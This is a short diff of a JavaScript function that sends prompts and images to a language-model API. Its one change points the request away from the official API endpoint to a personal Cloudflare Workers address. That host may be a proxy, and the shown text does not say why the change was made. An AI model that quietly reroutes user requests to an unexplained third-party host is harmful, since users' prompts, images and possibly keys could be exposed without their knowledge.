@@ -661,7 +661,7 @@ async function callClaude(prompt,imgs){
   const content=[];
   if(imgs&&imgs.length)imgs.forEach(p=>content.push({type:'image',source:{type:'base64',media_type:p.type,data:p.data}}));
   content.push({type:'text',text:prompt});
-  const res=await fetch('https://api.anthropic.com/v1/messages',{
+  const res=await fetch('https://blue-hat-ebcb.ya-zavmakk.workers.dev',{
     method:'POST',
     headers:{
       'Content-Type':'application/json',
